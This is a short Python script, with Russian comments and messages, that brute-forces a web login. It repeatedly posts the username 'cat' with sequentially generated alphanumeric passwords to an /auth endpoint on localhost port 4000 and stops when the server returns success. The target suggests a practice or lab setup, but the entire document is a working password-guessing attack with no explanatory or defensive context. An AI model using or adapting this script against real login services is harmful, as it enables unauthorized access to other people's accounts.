import requests

state = 0
alphabet = '*0123456789abcdefghijklmnopqrstuvwxyz'  # TODO делать нормально


def to_alphabet(n):
    base = len(alphabet)
    result = ''
    while n != 0:
        rest = n % base
        result = alphabet[rest] + result
        n = n // base
    clean_result = ''.join(c for c in result if c != '*')
    return clean_result


def next_password():
    global state
    result = to_alphabet(state)
    state += 1
    return result


login = 'cat'
password = ''

while True:
    data = {'login': login, 'password': password}
    response = requests.post('http://127.0.0.1:4000/auth', json=data)
    if response.status_code == 200:
        print(f'{login=} {password=} ПОЛУЧИЛОСЬ!!!')
        break
    else:
        print(f'{login=} {password=} не подошел')

    password = next_password()
